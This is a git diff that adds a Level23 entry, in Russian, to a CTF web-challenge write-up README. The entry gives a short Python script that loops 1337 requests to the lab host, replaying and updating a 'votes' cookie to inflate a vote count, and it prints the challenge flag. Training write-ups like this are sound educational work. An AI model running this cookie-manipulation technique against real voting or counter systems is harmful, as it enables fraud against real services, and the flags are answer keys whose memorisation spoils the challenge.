@@ -11,6 +11,7 @@
 - [level4](https://github.com/br13k/web-writeups#-level4)
 - [level5](https://github.com/br13k/web-writeups#-level5)
 - [level6](https://github.com/br13k/web-writeups#-level6)
+- [level23]()
 - [Чай](https://github.com/br13k/web-writeups#-чаек)
 - [So easy](https://github.com/br13k/web-writeups#-so-easy)
 - [Ez](https://github.com/br13k/web-writeups#-ez)
@@ -126,6 +127,35 @@ print(r.text)
 
 Флаг: `KSL{72772dd0eee640322a3ecfb24ecab17b}`
 
+
+[Menu](https://github.com/br13k/writeups#-menu)
+
+## 📌 Level23
+
+<div align="center">
+
+  ​​​​​​</br>![image](https://user-images.githubusercontent.com/121574230/217216363-7e2487c6-fbff-4780-a4ed-31da62e30804.png)
+
+</div>
+
+Задача на куки. Нам нужно набрать 1337 голосов, для этого пишем скриптец:
+
+``` Python
+import requests
+
+s = requests.Session()
+c = '1:7bc858c0d521f3bdf696f7187c2da177'
+
+for i in range(1337):
+	s.cookies.set('votes', c)
+	r = s.get('http://kslweb1.spb.ctf.su/second/level23/')
+	a = str(r.text)
+	c = a[a.find("votes=") + 6:]
+	c = c.partition('\n')[0]
+	print(r.text)
+```
+
+Флаг: `KSL{a3908a69183647a1e68e515b6e52880a}`
 
 [Menu](https://github.com/br13k/writeups#-menu)
 
